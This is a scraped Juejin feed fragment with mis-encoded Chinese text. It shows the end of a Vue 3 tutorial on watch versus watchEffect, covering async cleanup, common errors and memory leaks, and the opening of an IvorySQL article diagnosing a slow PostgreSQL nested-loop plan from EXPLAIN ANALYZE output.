<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fcolor-palette" target="_blank" title="https://tools.cmdragon.cn/zh/apps/color-palette" ref="nofollow noopener noreferrer">è°ƒè‰²æ¿ç”Ÿæˆå™¨ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fonline-metronome" target="_blank" title="https://tools.cmdragon.cn/zh/apps/online-metronome" ref="nofollow noopener noreferrer">åœ¨çº¿èŠ‚æ‹å™¨ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fip-geolocation" target="_blank" title="https://tools.cmdragon.cn/zh/apps/ip-geolocation" ref="nofollow noopener noreferrer">IPå½’å±åœ°æŸ¥è¯¢ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fcss-grid-layout" target="_blank" title="https://tools.cmdragon.cn/zh/apps/css-grid-layout" ref="nofollow noopener noreferrer">CSSç½‘æ ¼å¸ƒå±€ç”Ÿæˆå™¨ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Femail-validator" target="_blank" title="https://tools.cmdragon.cn/zh/apps/email-validator" ref="nofollow noopener noreferrer">é‚®ç®±éªŒè¯å·¥å…· - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fcalligraphy-practice" target="_blank" title="https://tools.cmdragon.cn/zh/apps/calligraphy-practice" ref="nofollow noopener noreferrer">ä¹¦æ³•ç»ƒä¹ å­—å¸– - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Ffinance-calculator-suite" target="_blank" title="https://tools.cmdragon.cn/zh/apps/finance-calculator-suite" ref="nofollow noopener noreferrer">é‡‘èè®¡ç®—å™¨å¥—ä»¶ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fchinese-kinship-calculator" target="_blank" title="https://tools.cmdragon.cn/zh/apps/chinese-kinship-calculator" ref="nofollow noopener noreferrer">ä¸­å›½äº²æˆšå…³ç³»è®¡ç®—å™¨ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fprotobuf-toolkit" target="_blank" title="https://tools.cmdragon.cn/zh/apps/protobuf-toolkit" ref="nofollow noopener noreferrer">Protocol Buffer å·¥å…·ç®± - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fip-geolocation" target="_blank" title="https://tools.cmdragon.cn/zh/apps/ip-geolocation" ref="nofollow noopener noreferrer">IPå½’å±åœ°æŸ¥è¯¢ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fimage-upscaler" target="_blank" title="https://tools.cmdragon.cn/zh/apps/image-upscaler" ref="nofollow noopener noreferrer">å›¾ç‰‡æ— æŸæ”¾å¤§ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Ftext-compare" target="_blank" title="https://tools.cmdragon.cn/zh/apps/text-compare" ref="nofollow noopener noreferrer">æ–‡æœ¬æ¯”è¾ƒå·¥å…· - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fip-batch-lookup" target="_blank" title="https://tools.cmdragon.cn/zh/apps/ip-batch-lookup" ref="nofollow noopener noreferrer">IPæ‰¹é‡æŸ¥è¯¢å·¥å…· - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fdomain-finder" target="_blank" title="https://tools.cmdragon.cn/zh/apps/domain-finder" ref="nofollow noopener noreferrer">åŸŸåæŸ¥è¯¢å·¥å…· - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Fdns-toolkit" target="_blank" title="https://tools.cmdragon.cn/zh/apps/dns-toolkit" ref="nofollow noopener noreferrer">DNSå·¥å…·ç®± - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fzh%2Fapps%2Ffavicon-generator" target="_blank" title="https://tools.cmdragon.cn/zh/apps/favicon-generator" ref="nofollow noopener noreferrer">ç½‘ç«™å›¾æ ‡ç”Ÿæˆå™¨ - åº”ç”¨å•†åº— | å…è´¹å¥½ç”¨çš„åœ¨çº¿å·¥å…·</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.cmdragon.cn%2Fsitemap_index.xml" target="_blank" title="https://tools.cmdragon.cn/sitemap_index.xml" ref="nofollow noopener noreferrer">XML Sitemap</a></li>
</ul>
</details>
<ol start="3">
<li><strong>å‚æ•°è·å–</strong>ï¼šwatch çš„å›è°ƒå‡½æ•°å¯ä»¥è·å–å˜åŒ–å‰åçš„æ–°æ—§å€¼ï¼Œè€Œ watchEffect æ— æ³•ç›´æ¥è·å–è¿™äº›å€¼ã€‚</li>
<li><strong>ä½¿ç”¨å¤æ‚åº¦</strong>ï¼šwatch éœ€è¦æ‰‹åŠ¨ç»´æŠ¤ç›‘å¬æºåˆ—è¡¨ï¼Œè€Œ watchEffect è‡ªåŠ¨ç®¡ç†ä¾èµ–ï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
</ol>
<h3 data-id="heading-26">é—®é¢˜ 2ï¼š</h3>
<p>å¦‚ä½•åœ¨ watchEffect ä¸­å¤„ç†å¼‚æ­¥æ“ä½œçš„å‰¯ä½œç”¨æ¸…ç†ï¼Ÿè¯·ç»™å‡ºä»£ç ç¤ºä¾‹ã€‚</p>
<p><strong>ç­”æ¡ˆè§£æï¼š</strong>
å¯ä»¥ä½¿ç”¨ watchEffect å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° onCleanup æ¥æ³¨å†Œæ¸…ç†å‡½æ•°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/data`</span>, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
      <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
    })
  
  <span class="hljs-comment">// å½“ä¾èµ–å˜åŒ–æ—¶ï¼Œå…ˆæ‰§è¡Œæ­¤æ¸…ç†å‡½æ•°</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    controller.<span class="hljs-title function_">abort</span>() <span class="hljs-comment">// å–æ¶ˆæœªå®Œæˆçš„è¯·æ±‚</span>
  })
})
</code></pre>
<p>è¿™ä¸ªæ¸…ç†å‡½æ•°ä¼šåœ¨ watchEffect é‡æ–°æ‰§è¡Œå‰è¢«è°ƒç”¨ï¼Œç¡®ä¿ä¹‹å‰çš„å¼‚æ­¥æ“ä½œè¢«æ­£ç¡®å–æ¶ˆï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæ¶ˆè€—å’Œæ½œåœ¨çš„é”™è¯¯ã€‚</p>
<h2 data-id="heading-27">å…­ã€å¸¸è§æŠ¥é”™è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-28">é”™è¯¯ 1ï¼šwatch ç›‘å¬ reactive å¯¹è±¡å±æ€§æ—¶æ— ååº”</h3>
<p><strong>é”™è¯¯è¡¨ç°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> })
<span class="hljs-comment">// æ­¤ä»£ç ä¸ä¼šç”Ÿæ•ˆ</span>
<span class="hljs-title function_">watch</span>(obj.<span class="hljs-property">count</span>, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'count changed:'</span>, newValue)
})
</code></pre>
<p><strong>åŸå› åˆ†æï¼š</strong>
watch æ— æ³•ç›´æ¥ç›‘å¬ reactive å¯¹è±¡çš„å±æ€§ï¼Œéœ€è¦ä½¿ç”¨ getter å‡½æ•°ã€‚</p>
<p><strong>è§£å†³åŠæ³•ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> obj.<span class="hljs-property">count</span>,
  <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'count changed:'</span>, newValue)
  }
)
</code></pre>
<h3 data-id="heading-29">é”™è¯¯ 2ï¼šwatchEffect æ— æ³•æ­£ç¡®è¿½è¸ªå¼‚æ­¥æ“ä½œä¸­çš„ä¾èµ–</h3>
<p><strong>é”™è¯¯è¡¨ç°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watchEffect</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>()
  <span class="hljs-comment">// æ­¤å¤„çš„ä¾èµ–ä¸ä¼šè¢«æ­£ç¡®è¿½è¸ª</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">value</span>.<span class="hljs-property">name</span>)
})
</code></pre>
<p><strong>åŸå› åˆ†æï¼š</strong>
watchEffect åªåœ¨åŒæ­¥æ‰§è¡Œé˜¶æ®µæ”¶é›†ä¾èµ–ï¼Œå¼‚æ­¥æ“ä½œä¸­çš„ä¾èµ–ä¸ä¼šè¢«è¿½è¸ªã€‚</p>
<p><strong>è§£å†³åŠæ³•ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// åœ¨åŒæ­¥é˜¶æ®µè®¿é—®ä¾èµ–</span>
  <span class="hljs-keyword">const</span> userId = user.<span class="hljs-property">value</span>.<span class="hljs-property">id</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/user/<span class="hljs-subst">${userId}</span>`</span>)
    <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
  }
  <span class="hljs-title function_">fetchData</span>()
})
</code></pre>
<h3 data-id="heading-30">é”™è¯¯ 3ï¼šå†…å­˜æ³„æ¼é—®é¢˜</h3>
<p><strong>é”™è¯¯è¡¨ç°ï¼š</strong>
åœ¨ç»„ä»¶å¸è½½åï¼Œwatch æˆ– watchEffect ä»ç„¶åœ¨æ‰§è¡Œï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p>
<p><strong>åŸå› åˆ†æï¼š</strong>
å¼‚æ­¥åˆ›å»ºçš„ä¾¦å¬å™¨ä¸ä¼šè‡ªåŠ¨ä¸ç»„ä»¶ç»‘å®šï¼Œéœ€è¦æ‰‹åŠ¨åœæ­¢ã€‚</p>
<p><strong>è§£å†³åŠæ³•ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‰‹åŠ¨åœæ­¢ä¾¦å¬å™¨</span>
<span class="hljs-keyword">const</span> unwatch = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ä¾¦å¬é€»è¾‘</span>
})

<span class="hljs-comment">// åœ¨ç»„ä»¶å¸è½½æ—¶åœæ­¢</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">unwatch</span>()
})
</code></pre>
<h2 data-id="heading-31">ä¸ƒã€å‚è€ƒé“¾æ¥</h2>
<ul>
<li>Vue 3 å®˜æ–¹æ–‡æ¡£ - ä¾¦å¬å™¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2Fguide%2Fessentials%2Fwatchers.html" target="_blank" title="https://vuejs.org/guide/essentials/watchers.html" ref="nofollow noopener noreferrer">vuejs.org/guide/essenâ€¦</a></li>
<li>Vue 3 å®˜æ–¹æ–‡æ¡£ - Composition APIï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2Fguide%2Fextras%2Fcomposition-api-faq.html" target="_blank" title="https://vuejs.org/guide/extras/composition-api-faq.html" ref="nofollow noopener noreferrer">vuejs.org/guide/extraâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‰§è¡Œè®¡åˆ’è·‘åï¼Œä½ äº†è§£èƒŒåçš„æ ¹å› å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600340964084596742</link>    <guid>https://juejin.cn/post/7600340964084596742</guid>    <pubDate>2026-01-29T07:19:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600340964084596742" data-draft-id="7600430748781641771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‰§è¡Œè®¡åˆ’è·‘åï¼Œä½ äº†è§£èƒŒåçš„æ ¹å› å—ï¼Ÿ"/> <meta itemprop="keywords" content="PostgreSQL,å¼€æº,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-29T07:19:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IvorySQL"/> <meta itemprop="url" content="https://juejin.cn/user/761327331579511"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‰§è¡Œè®¡åˆ’è·‘åï¼Œä½ äº†è§£èƒŒåçš„æ ¹å› å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/761327331579511/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IvorySQL
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:19:00.000Z" title="Thu Jan 29 2026 07:19:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å…³äºä½œè€…ï¼š</p>
<p>Nickyoungï¼Œæ•°æ®åº“é¢†åŸŸä»ä¸šè€…ã€‚PostgreSQL ACEï¼ŒIvorySQL ä¸“å®¶é¡¾é—®å§”å‘˜ä¼šæˆå‘˜ã€‚</p>
<p>å…¬ä¼—å·â€œğŸ‘‰PostgreSQL è¿ç»´ä¹‹é“â€ã€‚</p>
</blockquote>
<p>è¿˜åœ¨ä»¥æœ€ç»ˆ cost æ¥åˆ¤æ–­è®¡åˆ’æ˜¯å¦æœ€ä¼˜ï¼Ÿé‚£å°±å¤§é”™ç‰¹é”™äº†ï¼ï¼ï¼æœ¬ç¯‡è€æ¨å’Œå¤§å®¶ä¸€èµ·æŠ½ä¸å‰¥èŒ§ï¼Œä»æºç å…¥æ‰‹åˆ†æè®¡åˆ’è·‘åçš„åŸå› ã€‚</p>
<h2 data-id="heading-0">é—®é¢˜ç°è±¡</h2>
<p>ä¸€ä¸ªç®€å•æŸ¥è¯¢è¿è¡Œ 240sï¼Œä»æ‰§è¡Œè®¡åˆ’çœ‹è€—æ—¶ä¸»è¦åœ¨ nestloop joinï¼ŒOutter æ‰«æäº† 2293 è¡Œï¼Œinner loop æ‰«æäº† 2293 æ¬¡ï¼Œè€—æ—¶ 103.1 * 2293 = 236408ms</p>
<pre><code class="hljs language-sql" lang="sql">test<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>Â explainÂ analyzeÂ <span class="hljs-keyword">select</span>Â <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),zone_idÂ <span class="hljs-keyword">from</span>Â instance_infoÂ <span class="hljs-keyword">where</span>Â instanceidÂ <span class="hljs-keyword">in</span>Â (<span class="hljs-keyword">SELECT</span>Â instanceid
<span class="hljs-keyword">FROM</span>
Â  Â  instance_info
wherevisibleÂ <span class="hljs-operator">=</span>Â <span class="hljs-number">1</span>
GROUPBY
Â  Â  instanceid
<span class="hljs-keyword">HAVING</span>
Â  Â Â <span class="hljs-built_in">COUNT</span>(<span class="hljs-keyword">DISTINCT</span>Â zone_id) <span class="hljs-operator">&gt;</span>Â <span class="hljs-number">1</span>)Â andvisibleÂ <span class="hljs-operator">=</span>Â <span class="hljs-number">1</span>groupbyÂ zone_id;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â QUERY PLAN Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
<span class="hljs-comment">-------------------------------------------------------------------------------------------------------------------------------------------------</span>
Â GroupAggregate Â (cost<span class="hljs-operator">=</span><span class="hljs-number">232.45</span>.<span class="hljs-number">.232</span><span class="hljs-number">.47</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> width<span class="hljs-operator">=</span><span class="hljs-number">12</span>) (actual <span class="hljs-type">time</span><span class="hljs-operator">=</span><span class="hljs-number">244941.317</span>.<span class="hljs-number">.244942</span><span class="hljs-number">.725</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">4.00</span> loops<span class="hljs-operator">=</span><span class="hljs-number">1</span>)
Â  Â <span class="hljs-keyword">Group</span> Key: instance_info.zone_id
Â  Â Buffers: shared hit<span class="hljs-operator">=</span><span class="hljs-number">3</span>
Â  Â <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Â Sort Â (cost<span class="hljs-operator">=</span><span class="hljs-number">232.45</span>.<span class="hljs-number">.232</span><span class="hljs-number">.45</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> width<span class="hljs-operator">=</span><span class="hljs-number">4</span>) (actual <span class="hljs-type">time</span><span class="hljs-operator">=</span><span class="hljs-number">244940.890</span>.<span class="hljs-number">.244941</span><span class="hljs-number">.590</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">4588.00</span> loops<span class="hljs-operator">=</span><span class="hljs-number">1</span>)
Â  Â  Â  Â  Â Sort Key: instance_info.zone_id
Â  Â  Â  Â  Â Sort <span class="hljs-keyword">Method</span>: quicksort Â Memory: <span class="hljs-number">193</span>kB
Â  Â  Â  Â  Â Buffers: shared hit<span class="hljs-operator">=</span><span class="hljs-number">3</span>
Â  Â  Â  Â  Â <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Â Nested Loop Â (cost<span class="hljs-operator">=</span><span class="hljs-number">200.01</span>.<span class="hljs-number">.232</span><span class="hljs-number">.44</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> width<span class="hljs-operator">=</span><span class="hljs-number">4</span>) (actual <span class="hljs-type">time</span><span class="hljs-operator">=</span><span class="hljs-number">124.292</span>.<span class="hljs-number">.244935</span><span class="hljs-number">.769</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">4588.00</span> loops<span class="hljs-operator">=</span><span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">Join</span> <span class="hljs-keyword">Filter</span>: ((instance_info.instanceid)::text <span class="hljs-operator">=</span> (instance_info_1.instanceid)::text)
Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">Rows</span> Removed <span class="hljs-keyword">by</span> <span class="hljs-keyword">Join</span> <span class="hljs-keyword">Filter</span>: <span class="hljs-number">20185277</span>
Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Â <span class="hljs-keyword">Foreign</span> Scan Â (cost<span class="hljs-operator">=</span><span class="hljs-number">100.01</span>.<span class="hljs-number">.116</span><span class="hljs-number">.12</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> width<span class="hljs-operator">=</span><span class="hljs-number">146</span>) (actual <span class="hljs-type">time</span><span class="hljs-operator">=</span><span class="hljs-number">25.421</span>.<span class="hljs-number">.137</span><span class="hljs-number">.939</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">2293.00</span> loops<span class="hljs-operator">=</span><span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Relations: Aggregate <span class="hljs-keyword">on</span> (instance_info instance_info_1)
